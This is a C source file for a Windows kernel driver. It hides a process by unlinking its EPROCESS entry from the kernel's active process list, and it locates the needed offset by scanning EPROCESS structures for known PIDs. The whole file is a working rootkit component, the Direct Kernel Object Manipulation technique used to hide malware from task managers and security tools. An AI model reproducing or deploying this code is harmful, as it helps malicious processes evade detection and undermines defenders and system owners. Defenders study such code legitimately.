#include "Driver.h"

NTSTATUS hidep() {

	ULONG PID_OFFSET = find_eproc_pid();

	ULONG LIST_OFFSET = PID_OFFSET;

	LIST_OFFSET += sizeof(INT_PTR);

	PEPROCESS currentProcess = PsGetCurrentProcess();

	PLIST_ENTRY current = (PLIST_ENTRY)((ULONG_PTR)currentProcess + LIST_OFFSET);

	PLIST_ENTRY prev;
	PLIST_ENTRY next;

	prev = current->Blink;
	next = current->Flink;

	prev->Flink = next;
	next->Blink = prev;

	// Re-write the current LIST_ENTRY to point to itself (avoiding BSOD)
	current->Blink = (PLIST_ENTRY)&current->Flink;
	current->Flink = (PLIST_ENTRY)&current->Flink;

	return STATUS_SUCCESS;
}



ULONG find_eproc_pid() {

	ULONG pid_ofs = 0;					// The offset we're looking for
	int idx = 0;						// Index 
	ULONG pids[PROCAMOUNT] = { 0 };		// List of PIDs for our 3 processes
	PEPROCESS eprocs[PROCAMOUNT];		// Process list, will contain 3 processes

	// Select 3 process PIDs and get their EPROCESS Pointer
	for (int i = 16; idx < PROCAMOUNT; i += 4) {
		if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)i, &eprocs[idx]))) {
			pids[idx++] = i;
		}
	}

	for (int i = 0x20; i < 0x300; i += 4) {
		if ((*(ULONG*)((UCHAR*)eprocs[0] + i) == pids[0])
			&& (*(ULONG*)((UCHAR*)eprocs[1] + i) == pids[1])
			&& (*(ULONG*)((UCHAR*)eprocs[2] + i) == pids[2]))
		{
			pid_ofs = i; break;
		}
	}

	ObDereferenceObject(eprocs[0]);
	ObDereferenceObject(eprocs[1]);
	ObDereferenceObject(eprocs[2]);


	return pid_ofs;
}